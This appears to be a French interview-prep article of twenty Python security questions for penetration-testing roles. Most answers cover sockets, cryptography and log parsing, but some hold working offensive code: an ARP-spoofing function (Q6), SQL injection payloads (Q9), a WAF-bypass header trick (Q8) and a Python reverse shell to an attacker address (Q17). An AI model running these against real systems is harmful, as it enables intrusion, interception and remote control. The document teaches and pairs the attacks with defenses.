---
title: "Python pour la Cybersécurité : Questions-Réponses pour Pentesters"
description: "20 questions d'entretien sur Python et la sécurité pour les rôles de tests de pénétration et InfoSec. Couvre la programmation socket, Scapy, l'exploitation web, la cryptographie et le scripting d'automatisation."
date: 2026-02-11
tags: ["python", "interview", "security", "penetration-testing"]
keywords: ["python security interview", "infosec python questions", "scripting for hackers", "python pentest interview", "socket programming interview", "scapy interview questions", "python cryptography", "ethical hacking python", "security automation interview", "python exploit development"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "Python pour la Cybersécurité : Questions-Réponses pour Pentesters",
    "description": "20 questions d'entretien sur Python et la sécurité couvrant la programmation socket, la manipulation de paquets, l'exploitation web et l'automatisation.",
    "proficiencyLevel": "Advanced",
    "inLanguage": "fr"
  }
---

## Initialisation du Système

Python est le langage dominant dans la sécurité offensive et défensive. Les rôles de tests de pénétration, red team, analyste SOC et ingénierie de sécurité exigent tous une maîtrise de Python pour l'automatisation, le développement d'outils et le prototypage rapide. Les recruteurs attendent que vous écriviez du code sur le vif — des clients socket TCP aux créateurs de paquets en passant par les scripts d'exploits web. Ce guide couvre 20 questions qui testent l'intersection entre la programmation Python et les connaissances en sécurité.

**Besoin de snippets de code prêts ?** Gardez notre [Cheatsheet de Scripting Python pour la Sécurité](/cheatsheets/python-security-scripts/) ouvert pendant votre préparation.

---

## Réseau et Sockets

<details>
<summary><strong>1. Comment créer un client TCP en Python ?</strong></summary>
<br>

```python
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("target.com", 80))
client.send(b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n")
response = client.recv(4096)
print(response.decode())
client.close()
```

Points clés : `AF_INET` = IPv4, `SOCK_STREAM` = TCP. Pour UDP, utilisez `SOCK_DGRAM` et `sendto()`/`recvfrom()` au lieu de `connect()`/`send()`/`recv()`. Définissez toujours les timeouts dans les scripts de production : `client.settimeout(5)`.
</details>

<details>
<summary><strong>2. Comment fonctionne le three-way handshake TCP au niveau des sockets ?</strong></summary>
<br>

Lorsque vous appelez `client.connect((host, port))`, la bibliothèque socket de Python déclenche le système d'exploitation pour effectuer le three-way handshake :

1. Le SO envoie un paquet **SYN** au serveur.
2. Le serveur répond avec **SYN-ACK**.
3. Le SO envoie **ACK** — connexion établie, `connect()` retourne.

Si le handshake échoue (port fermé, timeout), `connect()` lève `ConnectionRefusedError` ou `socket.timeout`. Avec Scapy, vous pouvez manuellement créer et envoyer chaque paquet pour effectuer des scans SYN furtifs — en envoyant SYN, vérifiant le SYN-ACK, puis envoyant RST au lieu de ACK pour éviter de compléter le handshake.
</details>

<details>
<summary><strong>3. Écrivez un scanner de ports multi-thread en Python.</strong></summary>
<br>

```python
import socket
import threading
from queue import Queue

target = "192.168.1.1"
open_ports = []
lock = threading.Lock()
queue = Queue()

def scan(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        s.close()
        if result == 0:
            with lock:
                open_ports.append(port)
    except Exception:
        pass

def worker():
    while not queue.empty():
        scan(queue.get())
        queue.task_done()

for p in range(1, 1025):
    queue.put(p)

for _ in range(100):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

queue.join()
print(f"Open ports: {sorted(open_ports)}")
```

Points de discussion : Pourquoi des threads et pas des processus (I/O bound, pas CPU bound), pourquoi `connect_ex` plutôt que `connect` (retourne un code d'erreur au lieu de lever une exception), et pourquoi `settimeout` est critique (empêche le blocage sur les ports filtrés).
</details>

<details>
<summary><strong>4. Quelle est la différence entre `socket.connect()` et `socket.connect_ex()` ?</strong></summary>
<br>

- `connect()` : Lève une exception (`ConnectionRefusedError`, `TimeoutError`) si la connexion échoue. Adapté aux scripts où un échec doit arrêter l'exécution.
- `connect_ex()` : Retourne un code d'erreur au lieu de lever une exception. Retourne `0` en cas de succès, un errno non nul en cas d'échec. Meilleur pour les scanners de ports où vous devez vérifier des centaines de ports sans la surcharge de try/except.
</details>

## Scapy et Manipulation de Paquets

<details>
<summary><strong>5. Qu'est-ce que Scapy et pourquoi est-il préféré aux raw sockets ?</strong></summary>
<br>

Scapy est une bibliothèque Python pour la manipulation interactive de paquets. Elle vous permet de forger, envoyer, capturer et disséquer des paquets réseau à n'importe quelle couche de protocole.

Avantages par rapport aux raw sockets :
- **Construction couche par couche** : Construisez des paquets en empilant les couches de protocole : `IP()/TCP()/Raw()`.
- **Support des protocoles** : Support intégré pour des centaines de protocoles (ARP, DNS, ICMP, TCP, UDP, 802.11).
- **Analyse des réponses** : Associe automatiquement les requêtes aux réponses et les dissèque.
- **Mode interactif** : REPL pour l'expérimentation en temps réel des paquets.

Les raw sockets nécessitent une construction manuelle des paquets au niveau des octets et des permissions au niveau du système d'exploitation. Scapy abstrait tout cela en offrant le même niveau de contrôle.
</details>

<details>
<summary><strong>6. Comment effectuer un ARP spoofing avec Scapy ?</strong></summary>
<br>

```python
from scapy.all import ARP, Ether, sendp

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,  # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip  # Claim to be this IP
    )
    sendp(packet, verbose=0)
```

Cela envoie une réponse ARP non sollicitée indiquant à la cible que `spoof_ip` se trouve à votre adresse MAC. Le trafic destiné à `spoof_ip` est redirigé vers votre machine. Combiné avec le transfert IP, cela permet des attaques man-in-the-middle.

**Défense** : Entrées ARP statiques, Dynamic ARP Inspection (DAI), ou outils de surveillance ARP comme arpwatch.
</details>

<details>
<summary><strong>7. Comment capturer le trafic réseau et filtrer des protocoles spécifiques ?</strong></summary>
<br>

```python
from scapy.all import sniff, TCP, IP

def packet_handler(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        print(f"{src}:{sport} -> {dst}:{dport}")

# Capture HTTP traffic only
sniff(filter="tcp port 80", prn=packet_handler, count=50, store=0)
```

Le paramètre `filter` utilise la syntaxe BPF (Berkeley Packet Filter). `store=0` empêche de garder les paquets en mémoire. Nécessite des privilèges root/admin.
</details>

## Sécurité Web

<details>
<summary><strong>8. Comment automatiser les requêtes web pour les tests de sécurité ?</strong></summary>
<br>

```python
import requests

session = requests.Session()

# Custom headers to bypass basic WAFs
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "X-Forwarded-For": "127.0.0.1"
})

# Login and maintain session cookies
login_data = {"username": "admin", "password": "test"}
session.post("http://target.com/login", data=login_data)

# Authenticated request (cookies auto-included)
response = session.get("http://target.com/admin/dashboard")
print(response.status_code)
```

Concepts clés : `Session()` maintient les cookies entre les requêtes. Définissez toujours `timeout` dans les scripts de production. Utilisez `verify=False` uniquement dans les environnements de test contrôlés (désactive la vérification SSL).
</details>

<details>
<summary><strong>9. Comment testeriez-vous une injection SQL en utilisant Python ?</strong></summary>
<br>

```python
import requests

url = "http://target.com/search"
payloads = [
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--"
]

for payload in payloads:
    r = requests.get(url, params={"q": payload}, timeout=10)
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[!] Possible SQLi with: {payload}")
    if r.elapsed.seconds >= 5:
        print(f"[!] Time-based SQLi confirmed: {payload}")
```

Cela teste l'injection SQL basée sur les erreurs (messages d'erreur dans la réponse), basée sur union (sortie altérée) et blind basée sur le temps (réponse retardée). Pour les pentests professionnels, utilisez SQLMap — mais les recruteurs attendent que vous compreniez les mécanismes sous-jacents.
</details>

<details>
<summary><strong>10. Quelle est la différence entre requests.get() et urllib ?</strong></summary>
<br>

- **requests** : Bibliothèque tierce. API propre, analyse JSON automatique, gestion de sessions, connection pooling, support proxy. Le standard de l'industrie pour HTTP en Python.
- **urllib** : Bibliothèque standard. Plus verbeuse, de niveau inférieur. Pas de gestion de sessions. Utile lorsque vous ne pouvez pas installer de packages tiers (environnements restreints, fonctions lambda).

Pour les tests de sécurité, `requests` est préféré pour sa simplicité. Pour le développement d'exploits où minimiser les dépendances compte, `urllib` ou même les raw sockets peuvent être meilleurs.
</details>

## Cryptographie

<details>
<summary><strong>11. Quelle est la différence entre le hachage et le chiffrement ?</strong></summary>
<br>

- **Hachage** : Fonction unidirectionnelle. Entrée → empreinte de taille fixe. Ne peut pas être inversé. La même entrée produit toujours la même sortie. Utilisé pour la vérification d'intégrité, le stockage de mots de passe. Exemples : SHA-256, bcrypt, Argon2.
- **Chiffrement** : Fonction bidirectionnelle. Texte clair → texte chiffré (avec une clé) → texte clair (avec la clé). Conçu pour être inversé par le détenteur de la clé. Utilisé pour la confidentialité. Exemples : AES, RSA, ChaCha20.

Erreur courante : Utiliser MD5/SHA pour "chiffrer" des données. Le hachage n'est pas du chiffrement — vous ne pouvez pas récupérer les données originales à partir d'un hash (sans force brute).
</details>

<details>
<summary><strong>12. Comment implémenter le chiffrement AES en Python ?</strong></summary>
<br>

```python
from cryptography.fernet import Fernet

# Generate a key (store securely!)
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
plaintext = b"sensitive data"
ciphertext = cipher.encrypt(plaintext)

# Decrypt
decrypted = cipher.decrypt(ciphertext)
assert decrypted == plaintext
```

Fernet utilise AES-128-CBC avec HMAC-SHA256 pour le chiffrement authentifié. Pour un contrôle de plus bas niveau, utilisez `cryptography.hazmat` avec AES-GCM (chiffrement authentifié, pas besoin de HMAC séparé).

N'implémentez jamais vos propres primitives cryptographiques. Utilisez des bibliothèques établies.
</details>

<details>
<summary><strong>13. Comment hacher les mots de passe de manière sécurisée en Python ?</strong></summary>
<br>

```python
import bcrypt

# Hash a password
password = b"user_password"
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)

# Verify a password
if bcrypt.checkpw(password, hashed):
    print("Password matches")
```

Pourquoi bcrypt plutôt que SHA-256 : bcrypt est délibérément **lent** (rounds configurables), rendant les attaques par force brute impraticables. SHA-256 est conçu pour être rapide — un attaquant peut calculer des milliards par seconde avec des GPUs. Alternatives : Argon2 (memory-hard, recommandé pour les nouveaux projets), PBKDF2 (largement supporté).
</details>

## Automatisation et Scripting

<details>
<summary><strong>14. Comment gérer l'exécution de sous-processus de manière sécurisée en Python ?</strong></summary>
<br>

```python
import subprocess

# SECURE: Pass arguments as a list (no shell injection)
result = subprocess.run(
    ["nmap", "-sV", "-p", "80,443", "192.168.1.1"],
    capture_output=True, text=True, timeout=60
)
print(result.stdout)

# INSECURE: Never do this with user input
# subprocess.run(f"nmap {user_input}", shell=True)  # Command injection!
```

Règles : N'utilisez jamais `shell=True` avec des entrées contrôlées par l'utilisateur. Passez toujours les commandes sous forme de listes. Définissez `timeout` pour éviter les blocages. Utilisez `capture_output=True` pour collecter stdout/stderr.
</details>

<details>
<summary><strong>15. Comment analyser les fichiers de log avec Python ?</strong></summary>
<br>

```python
import re
from collections import Counter

failed_logins = Counter()

with open("/var/log/auth.log") as f:
    for line in f:
        match = re.search(r"Failed password .* from (\d+\.\d+\.\d+\.\d+)", line)
        if match:
            failed_logins[match.group(1)] += 1

# Top 10 offending IPs
for ip, count in failed_logins.most_common(10):
    print(f"{ip}: {count} failed attempts")
```

Pour les gros fichiers, lisez toujours ligne par ligne (jamais `.read()` de tout le fichier en mémoire). Utilisez `re.compile()` pour précompiler les patterns regex pour de meilleures performances.
</details>

<details>
<summary><strong>16. Qu'est-ce que le GIL et comment affecte-t-il les outils de sécurité ?</strong></summary>
<br>

Le **Global Interpreter Lock (GIL)** empêche plusieurs threads d'exécuter du bytecode Python simultanément. Un seul thread s'exécute à la fois dans CPython.

Impact sur les outils de sécurité :
- **Scanners de ports** (I/O-bound) : Le threading fonctionne bien. Les threads passent la plupart du temps à attendre les réponses réseau, pas à exécuter du code Python. Le GIL est libéré pendant les opérations d'I/O.
- **Crackers de mots de passe** (CPU-bound) : Le threading est inutile. Utilisez `multiprocessing` pour exploiter plusieurs cœurs de CPU, ou utilisez des extensions C (hashcat, John the Ripper) pour le cracking réel.
- **Alternative** : Utilisez `asyncio` pour des outils réseau à haute concurrence (des milliers de connexions simultanées avec un overhead minimal).
</details>

## Développement d'Exploits

<details>
<summary><strong>17. Comment créer un payload de reverse shell en Python ?</strong></summary>
<br>

```python
import socket, subprocess, os

def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    subprocess.call(["/bin/bash", "-i"])
```

Cela redirige stdin/stdout/stderr vers un socket TCP, donnant à l'attaquant un shell interactif. En entretien, expliquez le concept et la défense (filtrage de sortie, segmentation réseau, surveillance EDR) — pas seulement le code. Ceci est uniquement pour les tests autorisés et les défis CTF.
</details>

<details>
<summary><strong>18. Qu'est-ce que la sérialisation et pourquoi est-ce un risque de sécurité ?</strong></summary>
<br>

La sérialisation convertit les objets en octets pour le stockage/la transmission. La **désérialisation** de données non fiables est une vulnérabilité critique.

```python
import pickle

# DANGEROUS: Never unpickle untrusted data
data = pickle.loads(untrusted_bytes)  # Can execute arbitrary code!
```

Le module `pickle` de Python peut exécuter du code arbitraire pendant la désérialisation. Un attaquant peut créer un payload pickle qui lance un reverse shell lors du chargement.

Alternatives sûres : Utilisez `json` pour l'échange de données (aucune exécution de code possible). Si vous devez désérialiser des objets complexes, utilisez la validation `jsonschema` ou protobuf/msgpack avec des schémas stricts.
</details>

<details>
<summary><strong>19. Comment interagir avec les APIs REST pour la collecte OSINT ?</strong></summary>
<br>

```python
import requests

# Shodan API - find exposed services
api_key = "YOUR_API_KEY"
target = "8.8.8.8"
response = requests.get(
    f"https://api.shodan.io/shodan/host/{target}",
    params={"key": api_key}
)
data = response.json()

for service in data.get("data", []):
    print(f"Port {service['port']}: {service.get('product', 'unknown')}")
```

APIs OSINT courantes : Shodan (appareils exposés), VirusTotal (analyse de malware), Have I Been Pwned (données de violations), SecurityTrails (historique DNS). Respectez toujours les limites de débit et les conditions d'utilisation.
</details>

<details>
<summary><strong>20. Comment écrire un keylogger en Python et comment en détecter un ?</strong></summary>
<br>

Réponse conceptuelle (contexte d'entretien) :
Un keylogger s'accroche au système d'entrée du SO pour capturer les frappes clavier. Sous Linux, il lit depuis les périphériques `/dev/input/event*`. Sous Windows, il utilise l'API `SetWindowsHookEx` via `ctypes` ou `pynput`.

**Méthodes de détection** :
- Surveillez les processus accédant aux périphériques d'entrée : `lsof /dev/input/*`.
- Vérifiez les imports inattendus de `pynput`, `keyboard` ou `ctypes` dans les processus Python en cours d'exécution.
- Signatures EDR/antivirus pour les patterns de keylogger connus.
- Surveillance réseau pour l'exfiltration (les keyloggers doivent envoyer les données quelque part).

En entretien, mettez toujours l'accent sur la perspective défensive : comment détecter, prévenir et répondre aux keyloggers — pas seulement comment les construire.
</details>
